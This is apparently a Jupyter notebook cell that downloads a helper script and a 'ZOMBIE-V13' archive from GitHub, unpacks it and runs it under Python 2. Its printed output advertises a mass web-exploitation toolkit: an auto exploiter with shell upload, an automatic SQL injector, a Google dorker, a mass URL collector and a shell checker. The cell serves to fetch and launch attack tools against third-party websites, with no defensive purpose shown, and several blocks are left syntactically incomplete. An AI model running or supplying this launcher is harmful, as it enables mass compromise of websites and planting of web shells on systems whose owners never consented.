# %%
# Contact: https://t.me/biplob_sd
import urllib.request, os, zipfile
from IPython.display import clear_output

HOME = os.path.expanduser("~")

if not os.path.exists(f"{HOME}/.ipython/ocr.py"):
    hCode = "https://raw.githubusercontent.com/biplobsd/" \
                "OneClickRun/master/res/ocr.py"
    urllib.request.urlretrieve(hCode, f"{HOME}/.ipython/ocr.py")

from ocr import loadingAn, textAn

if not os.path.exists('/usr/local/lib/python2.7/dist-packages/colorama'):
  # !pip2 install requests colorama
clear_output()
loadingAn()
textAn("Getting zombie ready ...", ty='twg')

if not os.path.exists('tools/ZOMBIE/v13.py'):
  os.makedirs('tools', mode=0o777, exist_ok=True)

  toolsZipURL = 'https://github.com/whiteeyestor/zombiev13/raw/master/ZOMBIE-V13.zip'
  toolsZip = 'tools/ZOMBIE.zip'
  urllib.request.urlretrieve(toolsZipURL, toolsZip)
  with zipfile.ZipFile(toolsZip, 'r') as zip_ref:
    zip_ref.extractall('tools/ZOMBIE')
  os.remove(toolsZip)

if os.path.exists('tools/ZOMBIE/v13.py'):
  try:
    # %cd tools/ZOMBIE
    clear_output()
    # !python2 v13.py
  finally:
    # %cd /content
else:
  raise Exception('Tools not installed!')
# Out:
#   ______                      _       _     ____            _      __      __  __   ____
#  |___  /                     | |     (_)   |  _ \          | |     \ \    / / /_ | |___ \
#     / /    ___    _ __ ___   | |__    _    | |_) |   ___   | |_     \ \  / /   | |   __) |
#    / /    / _ \  | '_ ` _ \  | '_ \  | |   |  _ <   / _ \  | __|     \ \/ /    | |  |__ <
#   / /__  | (_) | | | | | | | | |_) | | |   | |_) | | (_) | | |_       \  /     | |  ___) |
#  /_____|  \___/  |_| |_| |_| |_.__/  |_|   |____/   \___/   \__|       \/      |_| |____/
#
#  [+] Fb:  https://fb.com/viper1337official/
#  [+] ICQ: 744289868
#  [+] Available Exploits:
# ...
#  [1] Zombi Bot V13 Private Scanner [Pro]
#  [2] Best Google Auto Dorker
#  [3] Mass Url Collector Multi Thread
#  [4] CMS Detector Site -filter website
#  [5] Reverse ip Priv8 Unlimted
#  [6] Multi shell checker ( live or no )
#  [7] Auto Exploiter Shell Upload Bot
#  [8] Automatic SQLI Injector
#  [9] Viper 1337 Private Bot
# ...
